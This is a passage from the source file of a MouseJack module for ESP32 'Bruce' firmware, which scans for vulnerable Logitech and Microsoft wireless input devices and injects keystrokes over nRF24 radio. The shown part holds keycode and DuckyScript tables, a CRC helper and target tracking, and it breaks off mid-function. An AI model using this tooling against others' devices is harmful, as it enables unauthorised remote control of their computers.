viniciushnf/ESP32-S3-Bruce-ST7735-1.8/bruce-firmware/src/modules/NRF24/nrf_mousejack.cpp
/**
 * @file nrf_mousejack.cpp
 * @brief MouseJack scan, fingerprint, and HID injection for Bruce firmware.
 *
 * Scans for vulnerable Microsoft and Logitech wireless mice/keyboards
 * using promiscuous nRF24L01+ reception, then injects HID keystrokes
 * via the same RF link.
 *
 * Credits: Based on uC_mousejack / Bastille Research / EvilMouse,
 *          adapted for Bruce architecture with multi-platform input.
 */
#if !defined(LITE_VERSION)
#include "nrf_mousejack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <globals.h>

// ── Tuning Constants ────────────────────────────────────────────
static constexpr int SCAN_TRIES_PER_CH = 6;
static constexpr int SCAN_DWELL_US = 500;
static constexpr int ATTACK_RETRANSMITS = 5;
static constexpr int ATTACK_INTER_KEY_MS = 10;

// ── Static module state ─────────────────────────────────────────
static MjTarget mj_targets[MJ_MAX_TARGETS];
static uint8_t mj_targetCount = 0;
static uint16_t mj_msSequence = 0;
static NRF24_MODE mj_nrfMode = NRF_MODE_SPI;

// ── ASCII to HID scancode lookup table ──────────────────────────
// Maps ASCII 0x20-0x7E to {modifier, keycode}
// Characters requiring SHIFT have MJ_MOD_LSHIFT set
static const MjHidKey ASCII_TO_HID[] = {
    // 0x20 SPACE
    {MJ_MOD_NONE,   MJ_KEY_SPACE    },
    // 0x21 !
    {MJ_MOD_LSHIFT, MJ_KEY_1        },
    // 0x22 "
    {MJ_MOD_LSHIFT, MJ_KEY_QUOTE    },
    // 0x23 #
    {MJ_MOD_LSHIFT, MJ_KEY_3        },
    // 0x24 $
    {MJ_MOD_LSHIFT, MJ_KEY_4        },
    // 0x25 %
    {MJ_MOD_LSHIFT, MJ_KEY_5        },
    // 0x26 &
    {MJ_MOD_LSHIFT, MJ_KEY_7        },
    // 0x27 '
    {MJ_MOD_NONE,   MJ_KEY_QUOTE    },
    // 0x28 (
    {MJ_MOD_LSHIFT, MJ_KEY_9        },
    // 0x29 )
    {MJ_MOD_LSHIFT, MJ_KEY_0        },
    // 0x2A *
    {MJ_MOD_LSHIFT, MJ_KEY_8        },
    // 0x2B +
    {MJ_MOD_LSHIFT, MJ_KEY_EQUAL    },
    // 0x2C ,
    {MJ_MOD_NONE,   MJ_KEY_COMMA    },
    // 0x2D -
    {MJ_MOD_NONE,   MJ_KEY_MINUS    },
    // 0x2E .
    {MJ_MOD_NONE,   MJ_KEY_DOT      },
    // 0x2F /
    {MJ_MOD_NONE,   MJ_KEY_SLASH    },
    // 0x30-0x39: 0-9
    {MJ_MOD_NONE,   MJ_KEY_0        }, // 0
    {MJ_MOD_NONE,   MJ_KEY_1        }, // 1
    {MJ_MOD_NONE,   0x1F            }, // 2
    {MJ_MOD_NONE,   0x20            }, // 3
    {MJ_MOD_NONE,   0x21            }, // 4
    {MJ_MOD_NONE,   0x22            }, // 5
    {MJ_MOD_NONE,   0x23            }, // 6
    {MJ_MOD_NONE,   MJ_KEY_7        }, // 7 = 0x24
    {MJ_MOD_NONE,   0x25            }, // 8
    {MJ_MOD_NONE,   0x26            }, // 9
    // 0x3A :
    {MJ_MOD_LSHIFT, MJ_KEY_SEMICOLON},
    // 0x3B ;
    {MJ_MOD_NONE,   MJ_KEY_SEMICOLON},
    // 0x3C <
    {MJ_MOD_LSHIFT, MJ_KEY_COMMA    },
    // 0x3D =
    {MJ_MOD_NONE,   MJ_KEY_EQUAL    },
    // 0x3E >
    {MJ_MOD_LSHIFT, MJ_KEY_DOT      },
    // 0x3F ?
    {MJ_MOD_LSHIFT, MJ_KEY_SLASH    },
    // 0x40 @
    {MJ_MOD_LSHIFT, 0x1F            }, // SHIFT+2
    // 0x41-0x5A: A-Z (uppercase = SHIFT + a-z)
    {MJ_MOD_LSHIFT, MJ_KEY_A        }, // A
    {MJ_MOD_LSHIFT, MJ_KEY_A + 1    }, // B
    {MJ_MOD_LSHIFT, MJ_KEY_A + 2    }, // C
    {MJ_MOD_LSHIFT, MJ_KEY_A + 3    }, // D
    {MJ_MOD_LSHIFT, MJ_KEY_A + 4    }, // E
    {MJ_MOD_LSHIFT, MJ_KEY_A + 5    }, // F
    {MJ_MOD_LSHIFT, MJ_KEY_A + 6    }, // G
    {MJ_MOD_LSHIFT, MJ_KEY_A + 7    }, // H
    {MJ_MOD_LSHIFT, MJ_KEY_A + 8    }, // I
    {MJ_MOD_LSHIFT, MJ_KEY_A + 9    }, // J
    {MJ_MOD_LSHIFT, MJ_KEY_A + 10   }, // K
    {MJ_MOD_LSHIFT, MJ_KEY_A + 11   }, // L
    {MJ_MOD_LSHIFT, MJ_KEY_A + 12   }, // M
    {MJ_MOD_LSHIFT, MJ_KEY_A + 13   }, // N
    {MJ_MOD_LSHIFT, MJ_KEY_A + 14   }, // O
    {MJ_MOD_LSHIFT, MJ_KEY_A + 15   }, // P
    {MJ_MOD_LSHIFT, MJ_KEY_A + 16   }, // Q
    {MJ_MOD_LSHIFT, MJ_KEY_A + 17   }, // R
    {MJ_MOD_LSHIFT, MJ_KEY_A + 18   }, // S
    {MJ_MOD_LSHIFT, MJ_KEY_A + 19   }, // T
    {MJ_MOD_LSHIFT, MJ_KEY_A + 20   }, // U
    {MJ_MOD_LSHIFT, MJ_KEY_A + 21   }, // V
    {MJ_MOD_LSHIFT, MJ_KEY_A + 22   }, // W
    {MJ_MOD_LSHIFT, MJ_KEY_A + 23   }, // X
    {MJ_MOD_LSHIFT, MJ_KEY_A + 24   }, // Y
    {MJ_MOD_LSHIFT, MJ_KEY_A + 25   }, // Z
    // 0x5B [
    {MJ_MOD_NONE,   MJ_KEY_LBRACKET },
    // 0x5C backslash
    {MJ_MOD_NONE,   MJ_KEY_BACKSLASH},
    // 0x5D ]
    {MJ_MOD_NONE,   MJ_KEY_RBRACKET },
    // 0x5E ^
    {MJ_MOD_LSHIFT, MJ_KEY_6        }, // SHIFT+6 = 0x23
    // 0x5F _
    {MJ_MOD_LSHIFT, MJ_KEY_MINUS    },
    // 0x60 `
    {MJ_MOD_NONE,   MJ_KEY_GRAVE    },
    // 0x61-0x7A: a-z (lowercase)
    {MJ_MOD_NONE,   MJ_KEY_A        }, // a
    {MJ_MOD_NONE,   MJ_KEY_A + 1    }, // b
    {MJ_MOD_NONE,   MJ_KEY_A + 2    }, // c
    {MJ_MOD_NONE,   MJ_KEY_A + 3    }, // d
    {MJ_MOD_NONE,   MJ_KEY_A + 4    }, // e
    {MJ_MOD_NONE,   MJ_KEY_A + 5    }, // f
    {MJ_MOD_NONE,   MJ_KEY_A + 6    }, // g
    {MJ_MOD_NONE,   MJ_KEY_A + 7    }, // h
    {MJ_MOD_NONE,   MJ_KEY_A + 8    }, // i
    {MJ_MOD_NONE,   MJ_KEY_A + 9    }, // j
    {MJ_MOD_NONE,   MJ_KEY_A + 10   }, // k
    {MJ_MOD_NONE,   MJ_KEY_A + 11   }, // l
    {MJ_MOD_NONE,   MJ_KEY_A + 12   }, // m
    {MJ_MOD_NONE,   MJ_KEY_A + 13   }, // n
    {MJ_MOD_NONE,   MJ_KEY_A + 14   }, // o
    {MJ_MOD_NONE,   MJ_KEY_A + 15   }, // p
    {MJ_MOD_NONE,   MJ_KEY_A + 16   }, // q
    {MJ_MOD_NONE,   MJ_KEY_A + 17   }, // r
    {MJ_MOD_NONE,   MJ_KEY_A + 18   }, // s
    {MJ_MOD_NONE,   MJ_KEY_A + 19   }, // t
    {MJ_MOD_NONE,   MJ_KEY_A + 20   }, // u
    {MJ_MOD_NONE,   MJ_KEY_A + 21   }, // v
    {MJ_MOD_NONE,   MJ_KEY_A + 22   }, // w
    {MJ_MOD_NONE,   MJ_KEY_A + 23   }, // x
    {MJ_MOD_NONE,   MJ_KEY_A + 24   }, // y
    {MJ_MOD_NONE,   MJ_KEY_A + 25   }, // z
    // 0x7B {
    {MJ_MOD_LSHIFT, MJ_KEY_LBRACKET },
    // 0x7C |
    {MJ_MOD_LSHIFT, MJ_KEY_BACKSLASH},
    // 0x7D }
    {MJ_MOD_LSHIFT, MJ_KEY_RBRACKET },
    // 0x7E ~
    {MJ_MOD_LSHIFT, MJ_KEY_GRAVE    },
};

// ── DuckyScript key name table ──────────────────────────────────
static const MjDuckyKey DUCKY_KEYS[] = {
    {"ENTER",       MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"RETURN",      MJ_MOD_NONE,   MJ_KEY_ENTER     },
    {"ESCAPE",      MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"ESC",         MJ_MOD_NONE,   MJ_KEY_ESC       },
    {"BACKSPACE",   MJ_MOD_NONE,   MJ_KEY_BACKSPACE },
    {"TAB",         MJ_MOD_NONE,   MJ_KEY_TAB       },
    {"SPACE",       MJ_MOD_NONE,   MJ_KEY_SPACE     },
    {"CAPSLOCK",    MJ_MOD_NONE,   MJ_KEY_CAPSLOCK  },
    {"DELETE",      MJ_MOD_NONE,   MJ_KEY_DELETE    },
    {"INSERT",      MJ_MOD_NONE,   MJ_KEY_INSERT    },
    {"HOME",        MJ_MOD_NONE,   MJ_KEY_HOME      },
    {"END",         MJ_MOD_NONE,   MJ_KEY_END       },
    {"PAGEUP",      MJ_MOD_NONE,   MJ_KEY_PAGEUP    },
    {"PAGEDOWN",    MJ_MOD_NONE,   MJ_KEY_PAGEDOWN  },
    {"UP",          MJ_MOD_NONE,   MJ_KEY_UP        },
    {"UPARROW",     MJ_MOD_NONE,   MJ_KEY_UP        },
    {"DOWN",        MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"DOWNARROW",   MJ_MOD_NONE,   MJ_KEY_DOWN      },
    {"LEFT",        MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"LEFTARROW",   MJ_MOD_NONE,   MJ_KEY_LEFT      },
    {"RIGHT",       MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"RIGHTARROW",  MJ_MOD_NONE,   MJ_KEY_RIGHT     },
    {"PRINTSCREEN", MJ_MOD_NONE,   MJ_KEY_PRINTSCR  },
    {"SCROLLLOCK",  MJ_MOD_NONE,   MJ_KEY_SCROLLLOCK},
    {"PAUSE",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"BREAK",       MJ_MOD_NONE,   MJ_KEY_PAUSE     },
    {"F1",          MJ_MOD_NONE,   MJ_KEY_F1        },
    {"F2",          MJ_MOD_NONE,   MJ_KEY_F1 + 1    },
    {"F3",          MJ_MOD_NONE,   MJ_KEY_F1 + 2    },
    {"F4",          MJ_MOD_NONE,   MJ_KEY_F1 + 3    },
    {"F5",          MJ_MOD_NONE,   MJ_KEY_F1 + 4    },
    {"F6",          MJ_MOD_NONE,   MJ_KEY_F1 + 5    },
    {"F7",          MJ_MOD_NONE,   MJ_KEY_F1 + 6    },
    {"F8",          MJ_MOD_NONE,   MJ_KEY_F1 + 7    },
    {"F9",          MJ_MOD_NONE,   MJ_KEY_F1 + 8    },
    {"F10",         MJ_MOD_NONE,   MJ_KEY_F1 + 9    },
    {"F11",         MJ_MOD_NONE,   MJ_KEY_F1 + 10   },
    {"F12",         MJ_MOD_NONE,   MJ_KEY_F12       },
    // Modifiers (keycode=NONE, only set modifier bits)
    {"CTRL",        MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"CONTROL",     MJ_MOD_LCTRL,  MJ_KEY_NONE      },
    {"SHIFT",       MJ_MOD_LSHIFT, MJ_KEY_NONE      },
    {"ALT",         MJ_MOD_LALT,   MJ_KEY_NONE      },
    {"GUI",         MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"WINDOWS",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"COMMAND",     MJ_MOD_LGUI,   MJ_KEY_NONE      },
    {"MENU",        MJ_MOD_NONE,   0x65             }, // HID Usage: Keyboard Application
    {"APP",         MJ_MOD_NONE,   0x65             },
    {nullptr,       0,             0                }  // Sentinel
};

// ── Helper: ASCII to HID ────────────────────────────────────────
static bool mj_asciiToHid(char c, MjHidKey &out) {
    if (c < 0x20 || c > 0x7E) return false;
    out = ASCII_TO_HID[c - 0x20];
    return (out.keycode != MJ_KEY_NONE);
}

// ── CRC16-CCITT for ESB packet validation ───────────────────────
static uint16_t mj_crcUpdate(uint16_t crc, uint8_t byte, uint8_t bits) {
    crc = crc ^ ((uint16_t)byte << 8);
    while (bits--) {
        if ((crc & 0x8000) == 0x8000) crc = (crc << 1) ^ 0x1021;
        else crc = crc << 1;
    }
    return crc & 0xFFFF;
}

// ── Target Management ───────────────────────────────────────────
static int mj_findTarget(const uint8_t *addr, uint8_t addrLen) {
    for (uint8_t i = 0; i < mj_targetCount; i++) {
        if (mj_targets[i].active && mj_targets[i].addrLen == addrLen &&
            memcmp(mj_targets[i].address, addr, addrLen) == 0) {
            return i;
        }
    }
    return -1;
}

static int mj_addTarget(const uint8_t *addr, uint8_t addrLen, uint8_t channel, MjDeviceType type) {
    int idx = mj_findTarget(addr, addrLen);
    if (idx >= 0) {
        mj_targets[idx].channel = channel;
        return idx;
    }
    if (mj_targetCount >= MJ_MAX_TARGETS) return -1;

